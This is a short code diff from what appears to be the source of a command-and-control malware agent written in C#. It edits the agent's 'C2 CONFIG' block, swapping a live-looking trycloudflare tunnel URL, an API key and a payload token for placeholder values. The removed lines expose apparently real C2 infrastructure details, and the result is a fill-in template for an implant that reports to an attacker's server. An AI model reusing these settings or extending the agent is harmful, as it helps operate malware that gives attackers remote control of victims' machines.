@@ -15,9 +15,9 @@ using System.Web.Script.Serialization;
 class Agent
 {
     // ============ C2 CONFIG ============
-    const string C2_URL = "https://paint-jail-husband-pharmacology.trycloudflare.com";
-    const string API_KEY = "220c43145f71479bf551dcd8cb52d9fa";
-    const string PAYLOAD_TOKEN = "31cf3801cde3f2198dd792f129e8fa5c";
+    const string C2_URL = "https://CHANGE-ME.trycloudflare.com";
+    const string API_KEY = "00000000000000000000000000000000";
+    const string PAYLOAD_TOKEN = "00000000000000000000000000000000";
     // ===================================
 
     static string agentId = "";
